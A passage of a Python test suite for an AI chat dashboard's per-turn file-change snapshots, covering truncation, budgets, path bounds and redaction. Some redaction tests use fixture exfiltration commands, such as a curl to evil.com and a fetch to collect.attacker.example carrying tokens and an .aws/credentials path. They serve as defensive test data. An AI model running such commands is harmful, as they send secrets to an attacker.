        changes = meta["file_changes"]
        assert len(changes) == 1
        assert changes[0]["before"] == changes[0]["after"] == "same content\n"

    def test_noop_and_real_change_both_surfaced(self, short_tmp_dir: Path):
        """No-op and real-change entries both survive the flush."""
        d = short_tmp_dir
        changed = d / "changed.py"
        changed.write_text("new content\n")
        unchanged = d / "unchanged.py"
        unchanged.write_text("same\n")

        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(changed), "content": "old content\n"},
            {"path": str(unchanged), "content": "same\n"},  # no-op
        ]
        _flush_file_changes(slot)
        meta = slot.messages[-1].get("meta", {})
        assert "file_changes" in meta
        changes = {c["path"]: c for c in meta["file_changes"]}
        assert len(changes) == 2
        assert changes[str(changed)]["before"] == "old content\n"
        assert changes[str(changed)]["after"] == "new content\n"
        assert changes[str(unchanged)]["before"] == changes[str(unchanged)]["after"]

    def test_flush_always_resets_accumulator(self, short_tmp_dir: Path):
        """The accumulator is cleared on every flush path, so an all-no-op
        turn can never leak its entries into a later turn and misattribute a
        stale entry."""
        d = short_tmp_dir
        f = d / "a.py"
        f.write_text("content_a\n")

        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": "content_a\n"}]
        _flush_file_changes(slot)
        assert slot._file_changes == []


class TestContentBlockRedactionAndTruncation:
    """Verify that content-block-sourced before text gets the same
    redaction and truncation treatment as disk-sourced text."""

    def test_truncation_applies_to_diff_old_text(self, tmp_path: Path):
        """Large content from a content block is capped at _MAX_SNAPSHOT."""
        f = tmp_path / "huge.py"
        f.write_text("short after\n")

        # Simulate a very large before-content from the content block
        huge_before = "x" * (_MAX_SNAPSHOT + 500)
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f)},
            diff_old_text=huge_before,
            diff_path=str(f),
        )
        assert result is not None
        assert len(result["content"]) < len(huge_before)
        assert "(truncated at" in result["content"]
        assert result["content"].startswith("x" * 100)

    def test_redaction_applies_to_content_block_before_in_flush(self, short_tmp_dir: Path):
        """Credentials in content-block-sourced 'before' are redacted by
        _flush_file_changes, just like disk-sourced content."""
        d = short_tmp_dir
        f = d / "config.yml"
        # After content is different (clean) so the entry isn't dropped as no-op
        f.write_text("aws_access_key_id=REPLACED_SAFELY\nversion=2\n")

        slot = _make_slot_with_assistant_message()
        # Before content contains a credential (from content block)
        slot._file_changes = [
            {"path": str(f), "content": "aws_access_key_id=AKIAIOSFODNN7EXAMPLE\n"}
        ]
        _flush_file_changes(slot)
        meta = slot.messages[-1].get("meta", {})
        assert "file_changes" in meta
        changes = meta["file_changes"]
        # The AKIA key in before must be scrubbed
        assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["before"]

    def test_chip_scrub_is_the_exfil_first_composition(self, short_tmp_dir: Path):
        """A long-query exfil URL in chip content loses its WHOLE url.

        `redact_exfiltration_urls` classifies partly by query length and
        replaces the entire url; a hand-sequenced creds-first pair here would
        shorten `?token=<long>` first and defeat it, leaking the destination
        and payload parameters into the chip diff (the same seam
        `discover.py`'s TestRedactExternalLayerOrder pins). The scrub must
        stay the canonical `security.redact()` composition.
        """
        d = short_tmp_dir
        f = d / "notes.md"
        f.write_text("clean after\n")
        exfil = (
            "fetch https://collect.attacker.example/?token="
            + "aB3" * 70
            + "&host=corp-laptop&path=/home/alice/.aws/credentials\n"
        )
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": exfil}]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        before = changes[0]["before"]
        assert "corp-laptop" not in before
        assert "/home/alice/.aws/credentials" not in before
        assert "?token=" not in before
        assert "[REDACTED: suspicious URL to collect.attacker.example]" in before

    def test_sensitive_path_refused_even_with_diff_old_text(self):
        """Even when diff_old_text is provided, sensitive paths are refused
        — credentials must never enter message meta regardless of source."""
        result = _snapshot_write_target(
            {"command": "strReplace", "path": "~/.aws/credentials"},
            diff_old_text="[default]\naws_access_key_id=AKIAEXAMPLE\n",
            diff_path="~/.aws/credentials",
        )
        # Must be None — sensitive path refusal takes priority
        assert result is None

    def test_exfil_url_redacted_in_content_block_before(self, short_tmp_dir: Path):
        """Exfiltration URLs in content-block before text are scrubbed."""
        d = short_tmp_dir
        f = d / "script.sh"
        # After content is clean
        f.write_text("echo 'clean'\n")

        slot = _make_slot_with_assistant_message()
        # Before has an exfiltration URL pattern
        slot._file_changes = [
            {"path": str(f), "content": "curl https://evil.com/exfil?data=secret\n"}
        ]
        _flush_file_changes(slot)
        meta = slot.messages[-1].get("meta", {})
        # If redact_exfiltration_urls masks the URL, it should differ from raw
        # The entry should still exist (before != after)
        assert "file_changes" in meta


# ── per-turn snapshot budget ────────────────────────────────────────────────


def _entry(path: str, chars: int, *, last_write: int | None = None) -> dict[str, object]:
    """One entry whose before+after spans ``chars`` and whose two sides differ."""
    body = chars
    half = body // 2
    entry: dict[str, object] = {
        "path": path,
        "before": "b" * half,
        "after": "a" * (body - half),
    }
    if last_write is not None:
        entry["_last_write"] = last_write
    return entry


def _noop_entry(path: str, chars: int, *, last_write: int | None = None) -> dict[str, object]:
    """An entry whose write changed nothing -- the format-on-save shape."""
    same = "s" * (chars // 2)
    entry: dict[str, object] = {"path": path, "before": same, "after": same}
    if last_write is not None:
        entry["_last_write"] = last_write
    return entry


# One snapshot side at its largest: the per-file cap plus its truncation marker.
_SIDE_AT_THE_CAP = _truncate_snapshot("x" * (_MAX_SNAPSHOT + 1)).content
# One entry at its worst case -- both sides at the cap -- which is what a file
# over the per-file cap on both sides stores. It exceeds the turn budget by its
# two markers, so as a NON-protected entry it is always demoted.
_MAXED_ENTRY_CHARS = 2 * len(_SIDE_AT_THE_CAP)


class TestTurnSnapshotBudget:
    @pytest.mark.parametrize("with_protected", [False, True])
    def test_path_only_rows_share_the_aggregate_budget(self, with_protected) -> None:
        paths = [
            f"/{i:03d}/" + "p" * (_MAX_SNAPSHOT_PATH_CHARS - 5)
            for i in range(_MAX_TURN_SNAPSHOT_ENTRIES)
        ]
        entries = [_entry(path, 0) for path in paths]
        if with_protected:
            entries.append(_entry("protected.py", _MAXED_ENTRY_CHARS))
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        charged = [e for e in ordered if e["path"] != "protected.py"]
        fits = _MAX_TURN_SNAPSHOT_CHARS // _MAX_SNAPSHOT_PATH_CHARS
        assert [e["path"] for e in charged] == paths[-fits:]
        assert sum(len(e["path"]) for e in charged) <= _MAX_TURN_SNAPSHOT_CHARS
        assert (demoted, dropped) == (0, len(paths) - fits)
        if with_protected:
            protected = next(e for e in ordered if e["path"] == "protected.py")
            assert len(protected["before"]) + len(protected["after"]) == _MAXED_ENTRY_CHARS

    def test_demoted_paths_consume_the_aggregate_budget(self) -> None:
        paths = [
            f"/{i:03d}/" + "p" * (_MAX_SNAPSHOT_PATH_CHARS - 5)
            for i in range(_MAX_TURN_SNAPSHOT_ENTRIES)
        ]
        entries = [_entry(path, _MAXED_ENTRY_CHARS) for path in paths]
        entries.append(_entry("protected.py", 2))
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        charged = [e for e in ordered if e.get("content_omitted")]
        fits = _MAX_TURN_SNAPSHOT_CHARS // _MAX_SNAPSHOT_PATH_CHARS
        assert [e["path"] for e in charged] == paths[-fits:]
        assert (demoted, dropped) == (fits, len(paths) - fits)
        assert all(e["before"] == e["after"] == "" for e in charged)
        assert sum(len(e["path"]) for e in charged) <= _MAX_TURN_SNAPSHOT_CHARS

    def test_path_and_content_exactly_fill_the_budget(self) -> None:
        entries = [
            _entry("old.py", 0),
            _entry("fits.py", _MAX_TURN_SNAPSHOT_CHARS - len("fits.py")),
            _entry("protected.py", 2),
        ]
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert [e["path"] for e in ordered] == ["fits.py", "protected.py"]
        assert (demoted, dropped) == (0, 1)
        assert sum(len(ordered[0][key]) for key in ("path", "before", "after")) == (
            _MAX_TURN_SNAPSHOT_CHARS
        )

    def test_under_budget_keeps_every_entry_untouched(self) -> None:
        entries = [_entry("a.py", 100), _entry("b.py", 100)]
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert demoted == 0
        assert [e["path"] for e in ordered] == ["a.py", "b.py"]
        assert all(e["before"] and e["after"] for e in ordered)
        assert all("content_omitted" not in e for e in ordered)

    def test_oldest_entries_lose_content_and_newest_keeps_it(self) -> None:
        # Three files at the worst case: the newest is protected and each of the
        # others alone exceeds the budget, so only the newest keeps its diff.
        entries = [
            _entry("oldest.py", _MAXED_ENTRY_CHARS),
            _entry("middle.py", _MAXED_ENTRY_CHARS),
            _entry("newest.py", _MAXED_ENTRY_CHARS),
        ]
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert demoted == 2
        # The kept diff sorts first, so it lands inside the card's visible rows.
        assert [e["path"] for e in ordered] == ["newest.py", "oldest.py", "middle.py"]
        assert ordered[0]["before"] and ordered[0]["after"]
        for entry in ordered[1:]:
            assert entry["before"] == ""
            assert entry["after"] == ""
            assert entry["truncated"] is True
            assert entry["content_omitted"] is True
            assert entry["turn_budget_chars"] == _MAX_TURN_SNAPSHOT_CHARS

    def test_budget_follows_the_last_write_not_the_first(self) -> None:
        # The turn edits early.py, then late.py, then early.py again. Dedupe
        # order puts early.py first, but it is the file the turn touched last.
        entries = [
            _entry("early.py", _MAXED_ENTRY_CHARS, last_write=2),
            _entry("late.py", _MAXED_ENTRY_CHARS, last_write=1),
        ]
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert demoted == 1
        assert ordered[0]["path"] == "early.py"
        assert ordered[0]["before"] and ordered[0]["after"]
        assert ordered[1]["path"] == "late.py"
        assert ordered[1]["content_omitted"] is True

    def test_an_idempotent_final_write_does_not_spend_the_protected_slot(self) -> None:
        # A format-on-save that changed nothing is the most recent entry; the
        # real change must keep its diff rather than fund a diff of nothing.
        entries = [
            _entry("real.py", _MAXED_ENTRY_CHARS, last_write=0),
            _noop_entry("formatted.py", _MAXED_ENTRY_CHARS, last_write=1),
        ]
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert demoted == 1
        kept = next(e for e in ordered if not e.get("content_omitted"))
        assert kept["path"] == "real.py"
        assert kept["before"] and kept["after"]

    def test_newest_entry_survives_even_when_it_alone_exceeds_the_budget(self) -> None:
        # The protected entry is outside the budget, so its size neither drops
        # it nor charges the small older file, which keeps its diff too.
        entries = [_entry("old.py", 10), _entry("huge.py", _MAX_TURN_SNAPSHOT_CHARS + 1)]
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert (demoted, dropped) == (0, 0)
        assert [e["path"] for e in ordered] == ["old.py", "huge.py"]
        assert all(e["before"] and e["after"] for e in ordered)

    def test_total_kept_content_stays_within_the_budget_plus_one_entry(self) -> None:
        # The protected entry is outside the budget, so the stored total is
        # bounded by the budget plus one entry at its worst case, never more.
        entries = [_entry(f"f{i}.py", 150_000) for i in range(12)]
        ordered, _demoted, _dropped = _apply_turn_snapshot_budget(entries)
        kept = sum(len(e["before"]) + len(e["after"]) for e in ordered)
        assert kept <= _MAX_TURN_SNAPSHOT_CHARS + _MAXED_ENTRY_CHARS
        assert kept > _MAX_TURN_SNAPSHOT_CHARS

    def test_a_noop_entry_cannot_push_the_kept_total_past_the_bound(self) -> None:
        # The no-op is not protected, so it is charged; the real diff is kept
        # outside the budget. Neither can exceed the budget-plus-one-entry bound.
        entries = [
            _entry("real.py", _MAXED_ENTRY_CHARS, last_write=0),
            _noop_entry("formatted.py", _MAXED_ENTRY_CHARS, last_write=1),
        ]
        ordered, _demoted, _dropped = _apply_turn_snapshot_budget(entries)
        kept = sum(len(e["before"]) + len(e["after"]) for e in ordered)
        assert kept <= _MAX_TURN_SNAPSHOT_CHARS + _MAXED_ENTRY_CHARS

    def test_a_maxed_protected_entry_does_not_demote_a_small_second_file(self) -> None:
        # The turn edits a file at the per-file cap on both sides and then a
        # two-character file. The protected entry is not charged, so the small
        # diff fits the budget and both are kept.
        side = _SIDE_AT_THE_CAP
        entries = [
            {"path": "small.py", "before": "x", "after": "y", "_last_write": 0},
            {"path": "big.py", "before": "b" + side[1:], "after": side, "_last_write": 1},
        ]
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert (demoted, dropped) == (0, 0)
        assert [e["path"] for e in ordered] == ["small.py", "big.py"]
        assert all(e["before"] and e["after"] for e in ordered)

    def test_the_budget_holds_one_more_large_entry_beside_the_protected_one(self) -> None:
        # Two maxed files where the older one is at the cap on one side only:
        # it fits the two-cap budget and keeps its diff beside the protected
        # entry, so a turn rewriting two large files shows both.
        side = _SIDE_AT_THE_CAP
        entries = [
            {"path": "older.py", "before": side, "after": "a" * (_MAX_SNAPSHOT - 100)},
            {"path": "newest.py", "before": side, "after": "z" + side[1:]},
        ]
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert (demoted, dropped) == (0, 0)
        assert [e["path"] for e in ordered] == ["older.py", "newest.py"]

    def test_a_turn_of_only_noop_writes_keeps_what_fits_and_demotes_the_rest(self) -> None:
        # Nothing has a real diff, so nothing is protected; the budget alone
        # decides, and the no-change captions that fit are kept.
        entries = [
            _noop_entry("a.py", _MAX_TURN_SNAPSHOT_CHARS - len("a.pyb.py"), last_write=0),
            _noop_entry("b.py", _MAX_TURN_SNAPSHOT_CHARS - len("a.pyb.py"), last_write=1),
        ]
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert demoted == 1
        assert ordered[0]["path"] == "b.py"
        assert ordered[0]["before"] == ordered[0]["after"] != ""

    def test_a_demoted_entry_drops_the_per_file_limit_field(self) -> None:
        # A file both individually truncated AND demoted reports one reason:
        # the turn budget, because its content is gone for that reason.
        entries = [
            {
                "path": "old.py",
                "before": "b" + _SIDE_AT_THE_CAP[1:],
                "after": _SIDE_AT_THE_CAP,
                "truncated": True,
                "snapshot_limit_chars": _MAX_SNAPSHOT,
            },
            _entry("newest.py", _MAXED_ENTRY_CHARS),
        ]
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert demoted == 1
        dropped = next(e for e in ordered if e.get("content_omitted"))
        assert dropped["path"] == "old.py"
        assert "snapshot_limit_chars" not in dropped

    def test_the_internal_write_order_key_never_reaches_a_stored_entry(self) -> None:
        entries = [_entry("a.py", 10, last_write=0), _entry("b.py", 10, last_write=1)]
        ordered, _demoted, _dropped = _apply_turn_snapshot_budget(entries)
        assert all("_last_write" not in e for e in ordered)

    def test_the_row_count_is_bounded_even_when_every_row_is_path_only(self) -> None:
        # A path-only row is not free, so the content budget alone would leave
        # the number of retained rows open.
        entries = [
            _entry(f"/f{i}.py", _MAXED_ENTRY_CHARS, last_write=i)
            for i in range(_MAX_TURN_SNAPSHOT_ENTRIES + 25)
        ]
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert len(ordered) == _MAX_TURN_SNAPSHOT_ENTRIES
        assert dropped == 25
        assert demoted == _MAX_TURN_SNAPSHOT_ENTRIES - 1

    def test_the_rows_dropped_for_the_count_are_the_oldest(self) -> None:
        entries = [
            _entry(f"/f{i}.py", 10, last_write=i) for i in range(_MAX_TURN_SNAPSHOT_ENTRIES + 3)
        ]
        ordered, _demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert dropped == 3
        kept_paths = {e["path"] for e in ordered}
        assert {"/f0.py", "/f1.py", "/f2.py"}.isdisjoint(kept_paths)

    def test_a_turn_within_the_count_keeps_a_path_for_every_file(self) -> None:
        # The older entry alone exceeds the content budget; it must still keep
        # its path rather than vanish from the card.
        entries = [
            _entry("/old.py", _MAXED_ENTRY_CHARS, last_write=0),
            _entry("/protected.py", _MAXED_ENTRY_CHARS, last_write=1),
        ]
        ordered, demoted, dropped = _apply_turn_snapshot_budget(entries)
        assert (demoted, dropped) == (1, 0)
        assert [e["path"] for e in ordered] == ["/protected.py", "/old.py"]

    def test_flush_records_paths_for_the_files_it_demotes(self, short_tmp_dir: Path) -> None:
        paths = []
        for index in range(3):
            target = short_tmp_dir / f"f{index}.txt"
            target.write_text("a" * _MAX_TURN_SNAPSHOT_CHARS)
            paths.append(target)
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(p), "content": "b" * _MAX_TURN_SNAPSHOT_CHARS} for p in paths
        ]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        # Every file keeps a path; the last-written one keeps its diff and leads.
        assert {c["path"] for c in changes} == {str(p) for p in paths}
        assert changes[0]["path"] == str(paths[-1])
        assert [bool(c.get("content_omitted")) for c in changes] == [False, True, True]
        assert all("_last_write" not in c for c in changes)

    def test_flush_charges_the_budget_to_the_files_written_last(self, short_tmp_dir: Path) -> None:
        early = short_tmp_dir / "early.txt"
        late = short_tmp_dir / "late.txt"
        for target in (early, late):
            target.write_text("a" * _MAX_TURN_SNAPSHOT_CHARS)
        slot = _make_slot_with_assistant_message()
        # early is written, then late, then early again.
        slot._file_changes = [
            {"path": str(early), "content": "b" * _MAX_TURN_SNAPSHOT_CHARS},
            {"path": str(late), "content": "b" * _MAX_TURN_SNAPSHOT_CHARS},
            {"path": str(early), "content": "ignored second before"},
        ]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        kept = next(c for c in changes if not c.get("content_omitted"))
        assert kept["path"] == str(early)
        # The first before is still the one stored, not the second write's.
        assert kept["before"].startswith("b")


class TestSnapshotPathBound:
    def test_the_bound_is_the_windows_extended_length_ceiling(self) -> None:
        # Windows native is a supported platform, and with the extended-length
        # prefix a path reaches 32,767 characters; a lower bound refuses a
        # snapshot for a file the OS can open.
        assert _MAX_SNAPSHOT_PATH_CHARS == 32_767

    def test_a_path_no_os_can_open_is_refused_at_admission(self) -> None:
        # The path is LLM-supplied; an entry keeps it even when its content is
        # dropped, so an unbounded one would ride onto the message regardless.
        long_path = "/tmp/" + "a" * (_MAX_SNAPSHOT_PATH_CHARS + 1) + ".txt"
        assert (
            _snapshot_write_target({"command": "create", "path": long_path}, diff_old_text="")
            is None
        )

    def test_a_windows_long_path_within_the_ceiling_is_admitted(self) -> None:
        # Longer than any Linux pathname, shorter than the Windows ceiling: the
        # length check lets it through to the path validator. The validator
        # itself decides on the path's content, not its length, so the test
        # confirms the length gate alone did not refuse it.
        long_path = "\\\\?\\C:\\" + "a" * 8_000 + "\\file.txt"
        assert 4_096 < len(long_path) <= _MAX_SNAPSHOT_PATH_CHARS
        with patch("kiro_crew.dashboard.chat_runner.validate_file_path") as validate:
            validate.return_value = None
            assert (
                _snapshot_write_target({"command": "create", "path": long_path}, diff_old_text="")
                is None
            )
            validate.assert_called_once_with(long_path)

    def test_a_path_at_the_bound_is_still_captured(self, tmp_path: Path) -> None:
        target = tmp_path / "small.txt"
        target.write_text("after")
        assert len(str(target)) <= _MAX_SNAPSHOT_PATH_CHARS
        captured = _snapshot_write_target(
            {"command": "create", "path": str(target)}, diff_old_text="before"
        )
        assert captured is not None
        assert captured["path"] == str(target)


class TestTurnSnapshotAccumulator:
    def test_repeated_writes_leave_room_for_a_new_path(self, short_tmp_dir: Path) -> None:
        slot = _make_slot_with_assistant_message()
        early = short_tmp_dir / "early.py"
        late = short_tmp_dir / "late.py"
        for index in range(_MAX_TURN_SNAPSHOT_ENTRIES * 2):
            before = "first\n" if index == 0 else "intermediate\n"
            _record_turn_snapshot(slot, {"path": str(early), "content": before})
        _record_turn_snapshot(slot, {"path": str(late), "content": ""})
        early.write_text("last\n")
        late.write_text("created\n")
        assert _turn_line_changes(slot._file_changes) == 3
        _flush_file_changes(slot)
        stored = {fc["path"]: fc for fc in slot.messages[-1]["meta"]["file_changes"]}
        assert set(stored) == {str(early), str(late)}
        assert stored[str(early)]["before"] == "first\n"
        assert stored[str(early)]["after"] == "last\n"

    @pytest.mark.parametrize("row_cap", [2, 3])
    def test_repeat_recency_drives_the_budget_at_and_below_the_cap(
        self, short_tmp_dir: Path, monkeypatch, row_cap: int
    ) -> None:
        monkeypatch.setattr("kiro_crew.dashboard.chat_runner._MAX_TURN_SNAPSHOT_ENTRIES", row_cap)
        monkeypatch.setattr("kiro_crew.dashboard.chat_runner._MAX_TURN_SNAPSHOT_CHARS", 0)
        slot = _make_slot_with_assistant_message()
        early = short_tmp_dir / "early.py"
        other = short_tmp_dir / "other.py"
        for target in (early, other):
            target.write_text("after\n")
            _record_turn_snapshot(slot, {"path": str(target), "content": "first\n"})
        _record_turn_snapshot(
            slot,
            {"path": str(early), "content": "intermediate\n", "truncated": True},
        )
        _flush_file_changes(slot)
        [stored] = slot.messages[-1]["meta"]["file_changes"]
        assert stored["path"] == str(early)
        assert stored["before"] == "first\n"
        assert "truncated" not in stored
        assert "_last_write" not in stored

    def test_record_holds_every_distinct_path_and_keeps_first_objects(self) -> None:
        slot = _make_slot_with_assistant_message()
        first = {"path": "/first.py", "content": "first", "truncated": False}
        _record_turn_snapshot(slot, first)
        for index in range(_MAX_TURN_SNAPSHOT_ENTRIES * 5):
            _record_turn_snapshot(slot, {"path": "/first.py", "content": "replacement"})
        assert slot._file_changes == [first]
        distinct = _MAX_TURN_SNAPSHOT_ENTRIES * 2
        for index in range(distinct):
            _record_turn_snapshot(slot, {"path": f"/f{index}.py", "content": "b"})
            _record_turn_snapshot(slot, {"path": "/first.py", "content": "replacement"})
        assert len(slot._file_changes) == distinct + 1
        assert len({fc["path"] for fc in slot._file_changes}) == distinct + 1
        assert slot._file_changes[-1] is first
        assert first == {"path": "/first.py", "content": "first", "truncated": False}

    def test_record_returns_nothing_for_the_caller_to_consult(self) -> None:
        slot = _make_slot_with_assistant_message()
        assert _record_turn_snapshot(slot, {"path": "/a.py", "content": ""}) is None
        assert _record_turn_snapshot(slot, {"path": "/a.py", "content": "x"}) is None


# ── the per-side bound after redaction ──────────────────────────────────────

# One redaction unit: a short credential that the ``?token=`` pass rewrites to a
# 22-character tag, so a side made of these grows about threefold on redaction.
_CREDENTIAL_UNIT = "x ?token=a "
_SIDE_BOUND = len(_SIDE_AT_THE_CAP)


def _credential_side(pad: str, offset: int) -> str:
    """A side of exactly ``_MAX_SNAPSHOT`` chars, dense with short credentials.

    ``offset`` pad chars lead the side, so two pads give two different sides,
    and it shifts where the post-redaction cut lands relative to the tags.
    """
    body = pad * offset + _CREDENTIAL_UNIT * (_MAX_SNAPSHOT // len(_CREDENTIAL_UNIT) + 1)
    return body[:_MAX_SNAPSHOT]


_SNAPSHOT_MARKER = _SIDE_AT_THE_CAP[_MAX_SNAPSHOT:]


class TestRedactedSideBound:
    # The post-redaction cut lands between two tags at offset 1 and inside a
    # tag at offset 15.
    @pytest.mark.parametrize("offset", [1, 15])
    def test_the_protected_entry_stays_within_the_per_side_bound(
        self, short_tmp_dir: Path, offset: int
    ) -> None:
        # The protected entry is the one the turn budget never charges, so the
        # per-side bound is all that holds its size once redaction expands it.
        target = short_tmp_dir / "creds.txt"
        target.write_text(_credential_side("a", offset))
        slot = _make_slot_with_assistant_message()
        raw = {"path": str(target), "content": _credential_side("b", offset), "truncated": False}
        slot._file_changes = [raw]
        _flush_file_changes(slot)
        [stored] = slot.messages[-1]["meta"]["file_changes"]
        sources = {"before": raw["content"], "after": target.read_text()}
        for side in ("before", "after"):
            assert len(stored[side]) <= _SIDE_BOUND, (side, len(stored[side]))
            # The bound is a plain cut of the redacted text at the per-side cap.
            assert stored[side] == redact(sources[side])[:_MAX_SNAPSHOT] + _SNAPSHOT_MARKER
        assert stored["truncated"] is True
        assert stored["snapshot_limit_chars"] == _MAX_SNAPSHOT
        # The flag lands on the stored copy only: the accumulator entry the
        # line count reads keeps its own flag.
        assert raw["truncated"] is False

    def test_a_side_within_the_bound_after_redaction_is_stored_unchanged(
        self, short_tmp_dir: Path
    ) -> None:
        target = short_tmp_dir / "few.txt"
        target.write_text("after " + _CREDENTIAL_UNIT)
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(target), "content": "before " + _CREDENTIAL_UNIT}]
        _flush_file_changes(slot)
        [stored] = slot.messages[-1]["meta"]["file_changes"]
        assert stored["before"] == "before x ?token=[REDACTED: credential] "
        assert stored["after"] == "after x ?token=[REDACTED: credential] "
        assert "truncated" not in stored

    def test_a_side_truncated_before_redaction_keeps_its_one_marker(
        self, short_tmp_dir: Path
    ) -> None:
        target = short_tmp_dir / "big.txt"
        target.write_text("y" * (_MAX_SNAPSHOT + 10))
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(target), "content": "b"}]
        _flush_file_changes(slot)
        [stored] = slot.messages[-1]["meta"]["file_changes"]
        assert stored["after"] == _truncate_snapshot("y" * (_MAX_SNAPSHOT + 10)).content

    def test_a_redacted_path_stays_within_the_path_bound(self) -> None:
        path = ("/q ?token=a" * (_MAX_SNAPSHOT_PATH_CHARS // 11 + 1))[:_MAX_SNAPSHOT_PATH_CHARS]
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": path, "content": "before"}]
        _flush_file_changes(slot)
        [stored] = slot.messages[-1]["meta"]["file_changes"]
        assert len(stored["path"]) <= _MAX_SNAPSHOT_PATH_CHARS
        assert stored["path"].endswith("...")


# ── omitted files on the persisted snapshot ────────────────────────────────


@pytest.fixture
def snapshot_turn():
    """Execute the runner's actual admission and flush statements.

    Extracting these statements avoids starting an ACP session or duplicating
    the admission code. Both event sites and both exit sites must exist, and a
    mutation to either executes in the test.
    """
    tree = ast.parse(inspect.getsource(_run_chat))
    [runner] = tree.body
    admissions = sorted(
        (
            node
            for node in ast.walk(runner)
            if isinstance(node, ast.If)
            and isinstance(node.test, ast.Name)
            and node.test.id in {"_file_snapshot", "_file_snapshot_upd"}
        ),
        key=lambda node: node.lineno,
    )
    flushes = sorted(
        (
            node
            for node in ast.walk(runner)
            if isinstance(node, ast.Expr)
            and isinstance(node.value, ast.Call)
            and isinstance(node.value.func, ast.Name)
            and node.value.func.id == "_flush_file_changes"
        ),
        key=lambda node: node.lineno,
    )
    assert len(admissions) == len(flushes) == 2

    def run(nodes, env):
        exec(compile(ast.Module(body=nodes, type_ignores=[]), "<snapshot-turn>", "exec"), env)  # nosemgrep: python.lang.security.audit.exec-detected.exec-detected -- runs the PRODUCTION admission statements lifted out of this repo's own source by AST, never external input; a hand-copied duplicate of them is exactly what this test exists to rule out  # noqa: E501  # fmt: skip

    def start(slot):
        env = {**_run_chat.__globals__, "slot": slot}

        def record(path, key="call", site=0, content="before\n"):
            env["event"] = SimpleNamespace(tool_call_id=key)
            env["_file_snapshot" if site == 0 else "_file_snapshot_upd"] = {
                "path": path,
                "content": content,
                "truncated": False,
            }
            run([admissions[site]], env)

        return SimpleNamespace(
            record=record, flush=lambda site=0: run([flushes[site]], env), env=env
        )

    return start


class TestOmittedSnapshotFiles:
    @pytest.mark.parametrize("multiple", [2, 10])
    def test_large_flush_visits_dropped_indices_at_most_once(self, monkeypatch, multiple):
        from kiro_crew.dashboard import chat_runner

        total = _MAX_TURN_SNAPSHOT_ENTRIES * multiple
        visited = 0

        def tracked_set(indices=()):
            def counted_indices():
                nonlocal visited
                for index in indices:
                    visited += 1
                    yield index

            return set(counted_indices())

        monkeypatch.setattr(chat_runner, "set", tracked_set, raising=False)
        monkeypatch.setattr(
            chat_runner, "_safe_read_snapshot", lambda path: _truncate_snapshot("after\n")
        )
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": f"/f{index}.py", "content": "before\n"} for index in range(total)
        ]
        _flush_file_changes(slot)
        meta = slot.messages[-1]["meta"]
        dropped = total - _MAX_TURN_SNAPSHOT_ENTRIES
        assert [fc["path"] for fc in meta["file_changes"]] == [
            f"/f{index}.py" for index in range(dropped, total)
        ]
        assert all(
            fc["before"] == "before\n" and fc["after"] == "after\n" for fc in meta["file_changes"]
        )
        assert meta["file_changes_omitted_files"] == dropped
        assert slot._file_changes == []
        # Count index traversal work, not elapsed time or constructor calls.
        assert visited <= dropped

    @pytest.mark.parametrize("site", [0, 1], ids=["call", "update"])
    def test_a_turn_past_the_row_cap_keeps_the_files_it_wrote_last(self, snapshot_turn, site):
        slot = _make_slot_with_assistant_message()
        turn = snapshot_turn(slot)
        extra = 50
        total = _MAX_TURN_SNAPSHOT_ENTRIES + extra
        for index in range(total):
            turn.record(f"/f{index}.py", f"call-{index}", site)
        assert len(slot._file_changes) == total
        turn.flush(site)
        meta = slot.messages[-1]["meta"]
        assert {fc["path"] for fc in meta["file_changes"]} == {
            f"/f{index}.py" for index in range(extra, total)
        }
        assert meta["file_changes_omitted_files"] == extra
        assert type(meta["file_changes_omitted_files"]) is int
        # The success path's finally flush must not change the count.
        turn.flush(1)
        assert slot.messages[-1]["meta"]["file_changes_omitted_files"] == extra

    def test_repeating_a_path_adds_no_row_and_keeps_the_first_before(
        self, snapshot_turn, short_tmp_dir
    ):
        slot = _make_slot_with_assistant_message()
        turn = snapshot_turn(slot)
        target = short_tmp_dir / "same.py"
        target.write_text("last\n")
        turn.record(str(target), "a", 0, content="first\n")
        turn.record(str(target), "a", 1, content="second\n")
        turn.record(str(target), "b", 0, content="third\n")
        assert len(slot._file_changes) == 1
        turn.flush()
        [stored] = slot.messages[-1]["meta"]["file_changes"]
        assert stored["before"] == "first\n"
        assert stored["after"] == "last\n"
        assert "file_changes_omitted_files" not in slot.messages[-1]["meta"]

    def test_row_cap_and_path_budget_drops_are_counted_as_files(self, snapshot_turn, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.chat_runner._MAX_TURN_SNAPSHOT_ENTRIES", 2)
        monkeypatch.setattr("kiro_crew.dashboard.chat_runner._MAX_TURN_SNAPSHOT_CHARS", 0)
        slot = _ChatSlot("stopped")
        turn = snapshot_turn(slot)
        for index in range(3):
            turn.record(f"/f{index}.py", f"call-{index}")
